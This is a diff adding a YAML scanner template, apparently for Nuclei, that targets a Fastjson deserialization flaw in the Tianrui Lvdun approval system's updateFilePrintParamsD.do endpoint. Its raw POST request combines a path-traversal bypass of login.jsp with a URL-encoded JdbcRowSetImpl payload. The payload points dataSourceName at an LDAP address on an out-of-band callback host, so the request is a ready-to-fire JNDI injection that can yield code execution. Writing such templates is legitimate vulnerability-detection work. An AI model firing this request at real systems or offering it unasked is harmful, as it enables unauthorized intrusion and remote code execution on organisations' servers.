@@ -1,0 +1,24 @@
+id: tianrui-lvdun-approval-system-updatefileprintparamsd-deserialization
+info:
+  name: 天锐绿盾审批系统 updateFilePrintParamsD.do 接口反序列化漏洞
+  author: 0dayPoc
+  severity: high
+  tags: 天锐绿盾审批系统
+  description: 天锐绿盾审批系统存在反序列化漏洞，攻击者可通过构造恶意请求利用 updateFilePrintParamsD.do 等接口执行任意代码。
+http:
+- raw:
+  - |
+    POST /trwfe/login.jsp/.%2e/task/updateFilePrintParamsD.do HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+%22ldap%3A%2F%2F{{interactsh-url}}%3A50389%2F165c51%22%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - dns
